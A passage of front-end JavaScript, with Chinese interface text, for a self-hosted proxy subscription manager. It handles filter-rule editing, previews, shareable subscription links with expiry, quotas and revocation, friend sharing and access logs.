          <section class="pe-card"><div class="pe-card-head"><div><div class="pe-kicker">02 · REFINE</div><h2>高级筛选</h2><p>常用场景不需要打开这里。需要时再添加包含或排除条件。</p></div></div><div class="pe-advanced-grid"><div><div class="pe-subhead">包含条件</div><div id="p-include">${exprRows(r.include, 'include')}</div><button class="mini-btn" data-action="add-expr" data-kind="include">+ 添加包含条件</button></div><div><div class="pe-subhead">排除条件</div><div id="p-exclude">${exprRows(r.exclude, 'exclude')}</div><button class="mini-btn" data-action="add-expr" data-kind="exclude">+ 添加排除条件</button></div></div></section>
        </main>
        <aside class="pe-inspector"><div class="pe-inspector-head"><div class="pe-kicker">CONFIGURATION</div><h2>输出设置</h2><p>普通订阅与链式订阅使用同一个配置文件。</p></div><div class="pe-inspector-section"><span class="field-label">默认客户端</span><select class="select" id="p-target">${targets.map((target) => `<option value="${esc(target.value)}"${profile.defaultTarget === target.value ? ' selected' : ''}>${esc(target.label)}</option>`).join('')}</select><small>客户端带有明确 User-Agent 时会自动选择对应格式。</small></div><div class="pe-inspector-section"><span class="field-label">去重方式</span><select class="select" id="p-dedupe"><option value="off"${r.dedupe === 'off' ? ' selected' : ''}>不去重</option><option value="server-port"${r.dedupe === 'server-port' ? ' selected' : ''}>服务器 + 端口</option><option value="fingerprint"${r.dedupe === 'fingerprint' ? ' selected' : ''}>完整指纹</option></select><span class="field-label pe-label-gap">排序</span><select class="select" id="p-sort">${[['none','保持原顺序'],['region','按地区'],['name','按名称'],['type','按协议'],['source','按订阅源']].map(([value,label]) => `<option value="${value}"${r.sort === value ? ' selected' : ''}>${label}</option>`).join('')}</select></div><div class="pe-inspector-section"><span class="field-label">节点数量上限</span><input class="input" id="p-limit" type="number" min="0" max="5000" value="${r.limit ?? 0}"><small>0 表示不限制。链式配对会在此筛选之后生成。</small></div><div class="pe-inspector-section"><span class="field-label">重命名模板</span><input class="input" id="p-rename" value="${esc(r.rename?.[0]?.replace ?? '')}" placeholder="{flag} {regionZh} {index2}"><small>留空保持原名。</small></div><div class="pe-inspector-section"><span class="field-label">流量信息</span><select class="select" id="p-userinfo"><option value="sum"${profile.userinfoMode === 'sum' ? ' selected' : ''}>合计所有订阅源</option><option value="off"${profile.userinfoMode === 'off' ? ' selected' : ''}>不输出</option>${state.subscriptions.map((sub) => `<option value="follow:${esc(sub.id)}"${profile.userinfoMode === `follow:${sub.id}` ? ' selected' : ''}>跟随「${esc(sub.name)}」</option>`).join('')}</select></div><label class="checkbox-row pe-exclude-toggle"><input type="checkbox" id="p-defexc" ${r.useDefaultExclude !== false ? 'checked' : ''}>过滤机场信息节点</label>${r.pick?.length ? `<div class="pe-selected-note">已固定选择 ${r.pick.length} 个节点<button class="mini-btn" data-action="clear-rule-pick">清除</button></div>` : ''}</aside>
      </div>
    </div>`;
  activateProfileEditorPage();
}

/** 把表单当前状态收集成一份 FilterRule。 */
function collectRule() {
  const r = editingProfile.rule;

  const readExprs = (kind) =>
    [...document.querySelectorAll(`.expr-row[data-kind="${kind}"]`)]
      .map((row) => ({
        field: row.querySelector('.expr-field').value,
        op: row.querySelector('.expr-op').value,
        value: row.querySelector('.expr-value').value,
      }))
      .filter((e) => e.value.length > 0);

  const rule = {
    useDefaultExclude: document.getElementById('p-defexc').checked,
    dedupe: document.getElementById('p-dedupe').value,
    sort: document.getElementById('p-sort').value,
  };

  if (r.regions?.length) rule.regions = r.regions;
  if (r.types?.length) rule.types = r.types;
  if (r.pick?.length) {
    rule.pick = r.pick;
    rule.pickMode = r.pickMode ?? 'only';
  }

  const include = readExprs('include');
  if (include.length) rule.include = include;
  const exclude = readExprs('exclude');
  if (exclude.length) rule.exclude = exclude;

  const limit = Number(document.getElementById('p-limit').value) || 0;
  if (limit > 0) rule.limit = limit;

  const rename = document.getElementById('p-rename').value.trim();
  if (rename) rule.rename = [{ replace: rename }];

  const chainEnabled = document.getElementById('p-chain-enabled')?.checked;
  const entry = [...(document.getElementById('p-chain-entry')?.selectedOptions ?? [])].map((o) => o.value);
  const landing = [...(document.getElementById('p-chain-landing')?.selectedOptions ?? [])].map((o) => o.value);
  if (chainEnabled && entry.length && landing.length) {
    rule.chain = {
      enabled: true,
      entry: { pick: entry },
      landing: { pick: landing },
      nameTemplate: document.getElementById('p-chain-template').value.trim() || '{landing} via {entry}',
      keepLandingDirect: document.getElementById('p-chain-direct').checked,
      maxPairs: Math.min(1000, Math.max(1, Number(document.getElementById('p-chain-max').value) || 200)),
    };
  }

  return rule;
}

function collectProductRule() {
  const r = editingProfile.rule;
  const readExprs = (kind) => [...document.querySelectorAll(`.expr-row[data-kind="${kind}"]`)]
    .map((row) => ({
      field: row.querySelector('.expr-field').value,
      op: row.querySelector('.expr-op').value,
      value: row.querySelector('.expr-value').value,
    }))
    .filter((expr) => expr.value.length > 0);
  const rule = {
    useDefaultExclude: document.getElementById('p-defexc').checked,
    dedupe: document.getElementById('p-dedupe').value,
    sort: document.getElementById('p-sort').value,
  };
  if (r.regions?.length) rule.regions = r.regions;
  if (r.types?.length) rule.types = r.types;
  if (r.pick?.length) {
    rule.pick = r.pick;
    rule.pickMode = r.pickMode ?? 'only';
  }
  const include = readExprs('include');
  const exclude = readExprs('exclude');
  if (include.length) rule.include = include;
  if (exclude.length) rule.exclude = exclude;
  const limit = Number(document.getElementById('p-limit').value) || 0;
  if (limit > 0) rule.limit = limit;
  const rename = document.getElementById('p-rename').value.trim();
  if (rename) rule.rename = [{ replace: rename }];

  const chain = r.chain;
  const entry = chain?.entry?.pick ?? [];
  const landing = chain?.landing?.pick ?? [];
  if (document.getElementById('p-chain-enabled')?.checked && entry.length > 0 && landing.length > 0) {
    rule.chain = {
      enabled: true,
      entry: { pick: entry },
      landing: { pick: landing },
      nameTemplate: document.getElementById('p-chain-template').value.trim() || '{entry} -RELAY- {landing}',
      keepLandingDirect: document.getElementById('p-chain-direct').checked,
      maxPairs: Math.min(1000, Math.max(1, Number(document.getElementById('p-chain-max').value) || 200)),
    };
  }
  return rule;
}

let previewTimer = null;

/** 防抖的预览刷新。用户连续敲字时不必每个字符都打一次请求。 */
function refreshPreview() {
  clearTimeout(previewTimer);
  previewTimer = setTimeout(async () => {
    const statsEl = document.getElementById('p-stats');
    const previewEl = document.getElementById('p-preview');
    if (!statsEl || !previewEl) return;

    try {
      // collectRule 已经把地区/协议/勾选这些"存在 editingProfile 上"的部分
      // 一并带回来了，所以整体赋值即可，不需要再与旧值合并 ——
      // 合并反而会让"取消勾选最后一个地区"这类操作留下陈旧数据。
      const rule = collectRule();
      editingProfile.rule = rule;

      const result = await api.post('/preview', {
        rule,
        target: document.getElementById('p-target').value,
        limit: 50,
      });

      const s = result.stats;
      const drops = [];
      if (s.droppedByDefaultExclude) drops.push(`信息节点 ${s.droppedByDefaultExclude}`);
      if (s.droppedByExclude) drops.push(`排除规则 ${s.droppedByExclude}`);
      if (s.droppedBySelect) drops.push(`筛选条件 ${s.droppedBySelect}`);
      if (s.droppedByDedupe) drops.push(`去重 ${s.droppedByDedupe}`);
      if (s.droppedByLimit) drops.push(`数量上限 ${s.droppedByLimit}`);

      statsEl.innerHTML = `
        <span>筛选命中 <b>${s.output}</b> / ${s.input}</span>
        ${result.chain ? `<span>链式配对 <b>${result.chain.pairCount}</b> 对，最终 ${result.nodes.length} 个节点</span>` : ''}
        ${drops.length ? `<span class="drop">已滤除：${esc(drops.join('、'))}</span>` : ''}
        ${result.skipped.length ? `<span class="drop">格式不支持而跳过 ${result.skipped.length}：${esc(result.skipped[0].reason)}</span>` : ''}
        ${result.warnings.map((w) => `<span class="drop">${esc(w)}</span>`).join('')}`;

      previewEl.textContent = result.bodyPreview + (result.bodyTruncated ? '\n\n…（已截断）' : '');
    } catch (err) {
      statsEl.innerHTML = `<span class="drop">${esc(err.message)}</span>`;
    }
  }, 300);
}

async function saveProfile() {
  const payload = {
    name: document.getElementById('p-name').value.trim(),
    description: document.getElementById('p-desc').value.trim(),
    icon: document.getElementById('p-icon').value.trim() || '📦',
    rule: collectProductRule(),
    defaultTarget: document.getElementById('p-target').value,
    userinfoMode: document.getElementById('p-userinfo').value,
  };

  if (!payload.name) {
    toast('名称不能为空', 'error');
    return;
  }

  try {
    if (editingProfile.id) {
      await api.patch(`/profiles/${encodeURIComponent(editingProfile.id)}`, payload);
      toast('已保存');
    } else {
      await api.post('/profiles', payload);
      toast('配置文件已创建');
    }
    closeProfilePage();
    await loadAll();
  } catch (err) {
    toast(err.message, 'error');
  }
}

// ── 订阅链接 ──────────────────────────────────────────
function tokenFormModal({ profileId = '', friendId = '', token = null } = {}) {
  const editing = Boolean(token);
  const current = token ?? { label: '', expiresAt: null, maxAccess: 10, quotaWindowHours: 24, sourceLimit: null };
  openModal(`
    <div class="modal-title">${editing ? '编辑订阅链接' : '生成订阅链接'}</div>
    <div class="modal-sub">到期和次数限制只作用于订阅文件拉取。它们不会估算代理流量。</div>
    <div class="field-row">
      <div class="field"><label class="field-label">配置文件</label>
        <select class="select" id="tf-profile" ${editing ? 'disabled' : ''}>
          ${state.profiles.map((p) => `<option value="${esc(p.id)}"${p.id === profileId ? ' selected' : ''}>${esc(p.name)}</option>`).join('')}
        </select>
      </div>
      <div class="field"><label class="field-label">备注</label><input class="input" id="tf-label" value="${esc(current.label ?? '')}"></div>
    </div>
    <div class="field-row">
      <div class="field"><label class="field-label">有效期</label>
        <select class="select" id="tf-expiry">
          <option value="7">7 天</option><option value="30">30 天</option><option value="90">90 天</option>
          <option value="never"${current.expiresAt === null ? ' selected' : ''}>永不过期</option><option value="custom">自定义日期</option>
        </select>
        <input class="input" id="tf-date" type="date" style="margin-top:6px;display:none">
      </div>
      <div class="field"><label class="field-label">次数上限</label>
        <div class="field-row"><input class="input" id="tf-max" type="number" min="1" placeholder="不限" value="${current.maxAccess ?? ''}">
        <select class="select" id="tf-window"><option value="24">每 24 小时</option><option value="168">每 7 天</option><option value="0">累计</option></select></div>
        <div class="field-hint">默认每 24 小时 10 次。留空表示不限。</div>
      </div>
    </div>
    <div class="field"><label class="field-label">来源告警阈值（可选）</label><input class="input" id="tf-source" type="number" min="0" placeholder="跟随全局" value="${current.sourceLimit ?? ''}"></div>
    <div class="modal-actions"><button class="btn-sec" data-action="close-modal">取消</button><button class="btn-pri" data-action="save-token-form" data-token="${esc(token?.token ?? '')}" data-friend="${esc(friendId)}">${editing ? '保存' : '生成'}</button></div>
  `);
  const expiry = document.getElementById('tf-expiry');
  const date = document.getElementById('tf-date');
  expiry.addEventListener('change', () => { date.style.display = expiry.value === 'custom' ? 'block' : 'none'; });
  if (current.quotaWindowHours === null) document.getElementById('tf-window').value = '0';
  else if (current.quotaWindowHours) document.getElementById('tf-window').value = String(current.quotaWindowHours);
}

function linksModal(profileId) {
  const profile = state.profiles.find((p) => p.id === profileId);
  const tokens = state.tokens.filter((t) => t.profileId === profileId);

  openModal(`
    <div class="modal-title">📋 订阅链接</div>
    <div class="modal-sub">配置：${esc(profile.name)} · 当前命中 ${profile.matchedNodes} 个节点</div>

    ${
      tokens.length === 0
        ? `<div class="empty" style="padding:24px">还没有生成过链接</div>`
        : tokens
            .map(
              (t) => `
      <div class="token-row${t.revoked ? ' revoked' : (t.expiresAt !== null && t.expiresAt < Date.now()) || (t.maxAccess !== null && t.accessCount >= t.maxAccess) ? ' dead' : ''}">
        <span class="token-url" title="${esc(t.url)}">${esc(t.url)}</span>
        ${
          t.revoked
            ? `<span class="ptag">已吊销</span><button class="icobtn" data-action="token-access" data-token="${esc(t.token)}">📊</button><button class="icobtn danger" data-action="delete-token" data-token="${esc(t.token)}">🗑 清理</button>`
            : `<button class="icobtn" data-action="copy-token" data-url="${esc(t.url)}">复制</button>
               <button class="icobtn" data-action="edit-token" data-token="${esc(t.token)}">编辑</button>
               <button class="icobtn" data-action="token-access" data-token="${esc(t.token)}">📊</button>
               <button class="icobtn" data-action="rotate-token" data-token="${esc(t.token)}">轮换</button>
               <button class="icobtn danger" data-action="revoke-token" data-token="${esc(t.token)}">吊销</button>`
        }
      </div>
      <div class="field-hint" style="margin:-2px 0 8px">
        ${esc(t.label || '未命名')} · 创建于 ${fmtDate(t.createdAt)} ·
        ${tokenExpiryHtml(t.expiresAt)} · ${tokenQuotaHtml(t)} · 上次 ${fmtTime(t.lastAccessAt)}
      </div>`,
            )
            .join('')
    }

    <div class="modal-hint" style="margin-top:14px">
      <strong>一条链接，各客户端通用。</strong>
      Clash / Clash.Meta / Shadowrocket / v2rayN 会被自动识别，各自拿到对应格式；
      需要强制指定时在链接后加 <code>?target=clash.meta</code>（可选值：clash、clash.meta、shadowrocket、v2ray）。<br><br>
      <strong>不提供二维码。</strong>生成二维码需要把链接交给第三方服务，
      而这条链接等同于你全部节点的访问凭证 —— 不值得为了方便承担这个风险。
    </div>

    <div class="modal-actions">
      <button class="btn-sec" data-action="close-modal">关闭</button>
      <button class="btn-pri" data-action="new-token" data-id="${esc(profileId)}">生成新链接</button>
    </div>
  `);
}

// ── 好友表单 ──────────────────────────────────────────
function friendModal(friend) {
  openModal(`
    <div class="modal-title">${friend ? '编辑好友' : '添加好友'}</div>
    <div class="modal-sub">给好友单独生成订阅链接，可以随时单独吊销而不影响其他人。</div>

    <div class="field-row">
      <div class="field">
        <label class="field-label">名称</label>
        <input class="input" id="fr-name" value="${esc(friend?.name ?? '')}">
      </div>
      <div class="field" style="flex:0 0 110px">
        <label class="field-label">头像颜色</label>
        <input class="input" id="fr-color" type="color" value="${esc(friend?.color ?? '#6366f1')}">
      </div>
    </div>
    <div class="field">
      <label class="field-label">备注</label>
      <textarea class="textarea" id="fr-note" placeholder="例如：用 Shadowrocket，只给香港节点">${esc(friend?.note ?? '')}</textarea>
    </div>

    <div class="modal-actions">
      ${friend ? `<button class="btn-danger" data-action="delete-friend" data-id="${esc(friend.id)}">删除</button>` : ''}
      <div class="spacer"></div>
      <button class="btn-sec" data-action="close-modal">取消</button>
      <button class="btn-pri" data-action="save-friend" data-id="${esc(friend?.id ?? '')}">保存</button>
    </div>
  `);
}

// ── 拉取记录 ──────────────────────────────────────────
async function accessModal(friendId, tokenId = null) {
  const friend = friendId ? friendsCache.find((f) => f.id === friendId) : null;
  let entries = [];
  try {
    entries = await api.get(tokenId ? `/tokens/${encodeURIComponent(tokenId)}/access` : `/friends/${encodeURIComponent(friendId)}/access`);
  } catch (err) {
    toast(err.message, 'error');
    return;
  }

  openModal(`
    <div class="modal-title">${esc(friend?.name ?? '订阅链接')} 的拉取记录</div>
    <div class="modal-sub">
      这是我们能采集到的全部真实数据。代理流量不经过本服务，因此没有用量字段。
    </div>

    ${
      entries.length === 0
        ? '<div class="empty" style="padding:32px">还没有拉取记录</div>'
        : `<table class="ntable">
             <thead><tr><th>时间</th><th>客户端</th><th>格式</th><th>节点数</th><th>配置体积</th><th>来源</th></tr></thead>
             <tbody>
               ${entries
                 .map(
                   (e) => `<tr>
                     <td>${fmtTime(e.ts)}</td>
                     <td>${esc(e.client)}</td>
                     <td class="nsrc">${esc(e.target)}</td>
                     <td>${e.nodeCount}</td>
                     <td class="nsrc">${fmtBytes(e.bytes)}</td>
                     <td class="nmono" title="IP 的加盐哈希，不存明文">${esc(e.ipHash.slice(0, 8))}</td>
                   </tr>`,
                 )
                 .join('')}
             </tbody>
           </table>`
    }

    <div class="modal-actions">
      <button class="btn-sec" data-action="close-modal">关闭</button>
    </div>
  `, true);
}

// ─────────────────────────────────────────────────────────────
//  事件委托
// ─────────────────────────────────────────────────────────────

document.addEventListener('click', async (e) => {
  const el = e.target.closest('[data-action]');
  if (!el) return;

  const { action, id, value, friend, fp, token, url, kind, index, role } = el.dataset;

  // 侧栏的按钮嵌在可点击的卡片里，需要阻止冒泡触发卡片自身的点击
  if (['sync-sub', 'edit-sub'].includes(action)) e.stopPropagation();

  try {
    switch (action) {
      // ── 订阅源 ──
      case 'side-sync':
        document.getElementById('syncBtn').click();
        break;

      case 'focus-sub':
        state.focusedSub = state.focusedSub === id ? null : id;
        state.nodePage = 1;
        renderSidebar();
        applyFilter();
        break;

      case 'sync-sub': {
        el.textContent = '…';
        const result = await api.post(`/subscriptions/${encodeURIComponent(id)}/sync`);
        toast(
          result.ok
            ? result.notModified
              ? '内容未变更'
              : `同步完成，${result.nodeCount} 个节点`
            : `同步失败：${result.error}`,
          result.ok ? 'ok' : 'error',
        );
        await loadAll();
        break;
      }

      case 'edit-sub':
        subscriptionModal(state.subscriptions.find((s) => s.id === id));
        break;

      case 'save-sub':
        await saveSubscription(id || null);
        break;

      case 'delete-sub':
        if (!confirm('删除该订阅源？它的节点也会一并删除。')) break;
        await api.del(`/subscriptions/${encodeURIComponent(id)}`);
        toast('已删除');
        closeModal();
        await loadAll();
        break;

      // ── 节点筛选 ──
      case 'toggle-region':
        if (state.selRegions.has(value)) state.selRegions.delete(value);
        else state.selRegions.add(value);
        state.nodePage = 1;
        renderFilters();
        applyFilter();
        break;

      case 'toggle-type':
        if (state.selTypes.has(value)) state.selTypes.delete(value);
        else state.selTypes.add(value);
        state.nodePage = 1;
        renderFilters();
        applyFilter();
        break;

      case 'select-node':
        state.selectedNodeFp = fp;
        openNodeDetail(state.nodes.find((node) => node.fingerprint === fp));
        renderNodes(filteredNodes());
        break;

      case 'node-page':
        state.nodePage = Math.max(1, Number(el.dataset.page) || 1);
        applyFilter();
        break;

      case 'reset-node-filters':
        state.selRegions.clear();
        state.selTypes.clear();
        state.sourceFilter = '';
        state.statusFilter = '';
        state.query = '';
        state.nodeSort = 'default';
        state.nodePage = 1;
        document.getElementById('searchQ').value = '';
        document.getElementById('nodeSourceFilter').value = '';
        document.getElementById('nodeSort').value = 'default';
        document.getElementById('nodeStatusFilter').value = '';
        renderFilters();
        applyFilter();
        break;

      case 'copy-node': {
        // 完整凭据单独取，一次一个 —— 节点列表接口本身不返回凭据
        const { uri } = await api.get(`/nodes/${encodeURIComponent(fp)}/uri`);
        await copyText(uri);
        break;
      }

      case 'ping-node': {
        const result = await pingNode(fp);
        if (result.ok) toast(`${result.name} 连接成功，${result.latencyMs ?? 0} ms`);
        else toast(`${result.name} 连接失败（${result.error || 'unknown'}）`, 'warn');
        if (document.getElementById('nodeLatencyHistory')) {
          openNodeDetail(state.nodes.find((node) => node.fingerprint === fp));
        }
        break;
      }

      case 'ping-all-nodes':
        await pingAllNodes();
        break;

      case 'clear-picked':
        state.picked.clear();
        applyFilter();
        break;

      case 'profile-from-picked':
        // 「生成选择」：把勾选的节点指纹作为初始规则带进新建表单。
        // 存的是指纹而不是名字或下标，所以上游订阅刷新、节点改名后
        // 这份勾选依然有效（见后端 fingerprint.ts）。
        openProfilePage(null, {
          useDefaultExclude: true,
          dedupe: 'off',
          sort: 'region',
          pick: [...state.picked],
          pickMode: 'only',
        });
        break;

      // ── 配置文件 ──
      case 'edit-profile':
        openProfilePage(state.profiles.find((p) => p.id === id));
        break;

      case 'save-profile':
        await saveProfile();
        break;

      case 'delete-profile':
        if (!confirm('删除该配置文件？指向它的所有订阅链接都会立即失效。')) break;
        await api.del(`/profiles/${encodeURIComponent(id)}`);
        toast('已删除');
        closeProfilePage();
        await loadAll();
        break;

      case 'rule-region': {
        const list = editingProfile.rule.regions ?? [];
        editingProfile.rule.regions = list.includes(value)
          ? list.filter((v) => v !== value)
          : [...list, value];
        el.classList.toggle('on');
        break;
      }

      case 'rule-type': {
        const list = editingProfile.rule.types ?? [];
        editingProfile.rule.types = list.includes(value)
          ? list.filter((v) => v !== value)
          : [...list, value];
        el.classList.toggle('on');
        break;
      }

      case 'chain-add': {
        const chain = editingProfile.rule.chain ?? { enabled: true, entry: { pick: [] }, landing: { pick: [] } };
        const picks = new Set(chain[role]?.pick ?? []);
        picks.add(fp);
        chain[role] = { ...(chain[role] ?? {}), pick: [...picks] };
        chain.enabled = true;
        editingProfile.rule.chain = chain;
        refreshChainPicker();
        break;
      }

      case 'chain-remove': {
        const chain = editingProfile.rule.chain;
        if (chain) chain[role].pick = (chain[role].pick ?? []).filter((item) => item !== fp);
        refreshChainPicker();
        break;
      }

      case 'clear-rule-pick':
        delete editingProfile.rule.pick;
        delete editingProfile.rule.pickMode;
        refreshProfileNodePicker();
        updateProfilePickNote();
        break;

      case 'profile-node-toggle': {
        const picks = new Set(editingProfile.rule.pick ?? []);
        if (picks.has(fp)) picks.delete(fp);
        else picks.add(fp);
        if (picks.size) editingProfile.rule.pick = [...picks];
        else delete editingProfile.rule.pick;
        refreshProfileNodePicker();
        updateProfilePickNote();
        break;
      }

      case 'add-expr': {
        const container = document.getElementById(`p-${kind}`);
        // 索引取当前行数即可 —— 删除某行时我们直接移除 DOM 节点，
        // 索引可能不连续，但 collectRule 是遍历 DOM 读取的，不依赖索引连续
        const next = container.querySelectorAll('.expr-row').length;
        container.insertAdjacentHTML(
          'beforeend',
          exprRowHtml({ field: 'name', op: 'contains', value: '' }, kind, next),
        );
        break;
      }

      case 'del-expr':
        document.querySelector(`.expr-row[data-kind="${kind}"][data-index="${index}"]`)?.remove();
        break;

      // ── token ──
      case 'links':
        linksModal(id);
        break;

      case 'new-token': {
        tokenFormModal({ profileId: id });
        break;
      }

      case 'edit-token': {
        const current = state.tokens.find((t) => t.token === token);
        if (current) tokenFormModal({ profileId: current.profileId, friendId: current.friendId ?? '', token: current });
        break;
      }

      case 'save-token-form': {
        const expiry = document.getElementById('tf-expiry').value;
        const maxValue = document.getElementById('tf-max').value;
        const windowValue = document.getElementById('tf-window').value;
        const payload = {
          profileId: document.getElementById('tf-profile').value,
          friendId: friend || null,
          label: document.getElementById('tf-label').value.trim(),
          ...(expiry === 'never' ? { expiresAt: null } : expiry === 'custom' ? { expiresAt: new Date(`${document.getElementById('tf-date').value}T23:59:59`).getTime() } : { expiresInDays: Number(expiry) }),
          ...(maxValue ? { maxAccess: Number(maxValue), quotaWindowHours: windowValue === '0' ? null : Number(windowValue) } : { maxAccess: null, quotaWindowHours: null }),
          ...(document.getElementById('tf-source').value ? { sourceLimit: Number(document.getElementById('tf-source').value) } : {}),
        };
        const saved = token
          ? await api.patch(`/tokens/${encodeURIComponent(token)}`, payload)
          : await api.post('/tokens', payload);
        closeModal();
        await loadAll();
        if (!token) await copyText(saved.url);
        toast(token ? '链接已更新' : '链接已生成并复制');
        break;
      }

      case 'copy-token':
        await copyText(url);
        break;

      case 'rotate-token':
        if (!confirm('轮换后旧链接立即失效，对方需要重新导入新链接。继续？')) break;
        await api.post(`/tokens/${encodeURIComponent(token)}/rotate`);
        toast('已轮换，请把新链接发给对方');
        closeModal();
        await loadAll();
        break;

      case 'revoke-token':
        if (!confirm('吊销后该链接立即失效，无法恢复。继续？')) break;
        await api.post(`/tokens/${encodeURIComponent(token)}/revoke`);
        toast('已吊销');
        closeModal();
        await loadAll();
        break;

      case 'delete-token':
        if (!confirm('删除后这条链接的拉取记录将无法在界面上查看（记录本身保留在库中）。继续？')) break;
        await api.del(`/tokens/${encodeURIComponent(token)}`);
        toast('已清理链接');
        closeModal();
        await loadAll();
        break;

      // ── 好友 ──
      case 'edit-friend':
        friendModal(friendsCache.find((f) => f.id === id));
        break;

      case 'save-friend': {
        const payload = {
          name: document.getElementById('fr-name').value.trim(),
          note: document.getElementById('fr-note').value.trim(),
          color: document.getElementById('fr-color').value,
        };
        if (!payload.name) {
          toast('名称不能为空', 'error');
          break;
        }
        if (id) await api.patch(`/friends/${encodeURIComponent(id)}`, payload);
        else await api.post('/friends', payload);
        toast('已保存');
        closeModal();
        await loadAll();
        break;
      }

      case 'delete-friend':
        if (
          !confirm(
            '删除该好友？\n\n注意：他手里的订阅链接不会自动失效，只是不再关联到这个人。\n' +
              '要断掉对方访问，请先吊销对应的链接。',
          )
        )
          break;
        await api.del(`/friends/${encodeURIComponent(id)}`);
        toast('已删除');
        closeModal();
        await loadAll();
        break;

      case 'new-friend-token':
        tokenFormModal({ friendId: id });
        break;

      case 'create-friend-token': {
        const created = await api.post('/tokens', {
          profileId: document.getElementById('ft-profile').value,
          friendId: id,
          label: document.getElementById('ft-label').value.trim(),
        });
        closeModal();
        await loadAll();
        await copyText(created.url);
        toast('链接已生成并复制，请通过安全渠道发送');
        break;
      }

      case 'token-access': {
        await accessModal(null, token);
        break;
      }

      case 'friend-access':
        await accessModal(id);
        break;

      case 'close-modal':
        if (document.getElementById('pane-profile-editor')?.classList.contains('active')) closeProfilePage();
        else closeModal();
        break;

      case 'set-theme':
        applyTheme(el.dataset.theme === 'dark' ? 'dark' : 'light');
        renderSettings();
        break;

      case 'logout-from-settings':
        api.clearToken();
        showGate('已清除本机保存的 Token');
        break;

      default:
        break;
    }
  } catch (err) {
    toast(err.message, 'error');
  }
});

// 表单输入：规则编辑器里任何改动都触发预览刷新
document.addEventListener('input', (e) => {
  if (e.target.id === 'searchQ') {
    state.query = e.target.value;
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'p-chain-search') {
    chainPickerQuery = e.target.value;
    refreshChainPicker(true);
    return;
  }
  if (e.target.id === 'p-node-search') {
    profileNodePickerQuery = e.target.value;
    refreshProfileNodePicker(true);
  }
});
document.addEventListener('change', (e) => {
  if (e.target.dataset.action === 'pick-node') {
    const fp = e.target.dataset.fp;
    if (e.target.checked) state.picked.add(fp);
    else state.picked.delete(fp);
    applyFilter();
    return;
  }
  if (e.target.id === 'nodeRegionFilter') {
    state.selRegions = e.target.value ? new Set([e.target.value]) : new Set();
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'nodeSourceFilter') {
    state.sourceFilter = e.target.value;
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'nodeTypeFilter') {
    state.selTypes = e.target.value ? new Set([e.target.value]) : new Set();
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'nodeStatusFilter') {
    state.statusFilter = e.target.value;
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'nodeSort') {
    state.nodeSort = e.target.value;
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'nodePageSize') {
    state.nodePageSize = Number(e.target.value) || 100;
    state.nodePage = 1;
    applyFilter();
    return;
  }
  if (e.target.id === 'p-pick-mode') {
    editingProfile.rule.pickMode = e.target.value;
  }
});

// 标签页切换
function activateTab(tabName) {
  const editor = document.getElementById('pane-profile-editor');
  if (editor?.classList.contains('active')) {
    editor.innerHTML = '';
    editor.classList.remove('profile-editor-page');
    editingProfile = null;
    chainPickerQuery = '';
    profileNodePickerQuery = '';
  }
  document.querySelectorAll('.tab').forEach((tab) => tab.classList.toggle('active', tab.dataset.tab === tabName));
  document.querySelectorAll('.side-nav-item[data-tab]').forEach((tab) => tab.classList.toggle('active', tab.dataset.tab === tabName));
  document.querySelectorAll('.pane').forEach((pane) => pane.classList.toggle('active', pane.id === `pane-${tabName}`));
  const titles = { nodes: ['节点管理', '管理智能节点，支持多种协议和地区'], profiles: ['配置文件', '用清晰规则生成普通或链式订阅'], traffic: ['流量监控', '只展示来自上游的真实流量快照'], friends: ['共享管理', '管理好友、订阅链接和访问记录'], settings: ['系统设置', '查看服务状态并调整本机界面偏好'] };
  const title = titles[tabName] ?? titles.nodes;
  document.getElementById('pageTitle').textContent = title[0];
  document.getElementById('pageSubtitle').textContent = title[1];
}

function activateProfileEditorPage() {
  document.querySelectorAll('.tab, .side-nav-item[data-tab]').forEach((tab) => tab.classList.remove('active'));
  document.querySelectorAll('.pane').forEach((pane) => pane.classList.toggle('active', pane.id === 'pane-profile-editor'));
  document.getElementById('pageTitle').textContent = '订阅配置';
  document.getElementById('pageSubtitle').textContent = '直接选择节点、配置链式代理和输出格式';
}

function closeProfilePage() {
  const editor = document.getElementById('pane-profile-editor');
  if (editor) editor.innerHTML = '';
  editor?.classList.remove('profile-editor-page');
  editingProfile = null;
  chainPickerQuery = '';
  profileNodePickerQuery = '';
  activateTab('profiles');
}
document.querySelectorAll('.tab, .side-nav-item[data-tab]').forEach((tab) => {
  tab.addEventListener('click', () => activateTab(tab.dataset.tab));
});

// 顶栏按钮
document.getElementById('syncBtn').addEventListener('click', async (e) => {
  const btn = e.currentTarget;
  btn.textContent = '同步中…';
  btn.disabled = true;
  try {
    const result = await api.post('/sync');
    const { succeeded, failed } = result.summary;
    toast(
      failed ? `同步完成：${succeeded} 成功，${failed} 失败` : `全部 ${succeeded} 个订阅同步完成`,
      failed ? 'warn' : 'ok',
    );
    await loadAll();
  } catch (err) {
    toast(err.message, 'error');
  } finally {
    btn.textContent = '⟳ 全部同步';
    btn.disabled = false;
  }
});

document.getElementById('addSubBtn').addEventListener('click', () => subscriptionModal(null));
document.getElementById('newProfileBtn').addEventListener('click', () => openProfilePage(null));
document.getElementById('newProfileBtnDuplicate').addEventListener('click', () => openProfilePage(null));
document.getElementById('addFriendBtn').addEventListener('click', () => friendModal(null));
document.getElementById('refreshTrafficBtn').addEventListener('click', () => loadAll());
document.getElementById('logoutBtn').addEventListener('click', () => {
  api.clearToken();
  showGate('已清除本机保存的 Token');
});
document.getElementById('themeBtn').addEventListener('click', () => {
  applyTheme(document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark');
  renderSettings();
});
document.getElementById('nodeSort').addEventListener('change', (event) => {
  state.nodeSort = event.currentTarget.value;
  applyFilter();
});

// ─────────────────────────────────────────────────────────────
//  鉴权门
// ─────────────────────────────────────────────────────────────

const gate = document.getElementById('gate');

function showGate(message = '') {
  document.getElementById('gateErr').textContent = message;
  gate.classList.remove('hidden');
  document.getElementById('gateToken').focus();
}

function hideGate() {
  gate.classList.add('hidden');
}

async function tryEnter(token) {
  api.setToken(token);
  try {
    await loadAll();
    hideGate();
  } catch (err) {
    // loadAll 内部遇到 401 会自己调 showGate，这里处理其余错误
    if (err.message !== '未授权') {
      document.getElementById('gateErr').textContent = err.message;
